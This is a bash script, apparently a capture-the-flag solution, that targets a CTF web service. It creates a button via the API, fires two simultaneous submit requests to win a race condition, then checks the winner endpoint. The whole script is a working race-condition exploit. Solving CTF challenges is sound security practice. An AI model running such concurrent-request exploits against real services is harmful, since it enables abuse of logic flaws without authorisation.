#!/bin/bash 

# The first parameter is the URL to make the call to
HOST=http://web3.spokane-ctf.com:8001

# Create the button 
button_response=$(curl -X POST $HOST/add_button --silent --show-error) 
button_id=$(echo "$button_response" | grep "response" | cut -d ':' -f2 | cut -d '"' -f2)

# Hardcode the button id
#button_id="91fbdf19-d2d7-4a53-a092-c863538d9340"
echo "button ID: $button_id" 

# Make TWO requests at once. Hoping to catch the race condition
curl -X POST $HOST/submit -d '{"press":true,"button":"'$button_id'"}' -H 'Content-Type: application/json' --silent & > /dev/null
curl -X POST $HOST/submit -d '{"press":true,"button":"'$button_id'"}' -H 'Content-Type: application/json' --silent &  > /dev/null

# Check the press
sleep 2
press_response=$(curl -X GET $HOST/winner/$button_id --silent --show-error) 
press=$(echo "$press_response" | grep "response" | cut -d ':' -f2 | cut -d '"' -f2)

echo $press




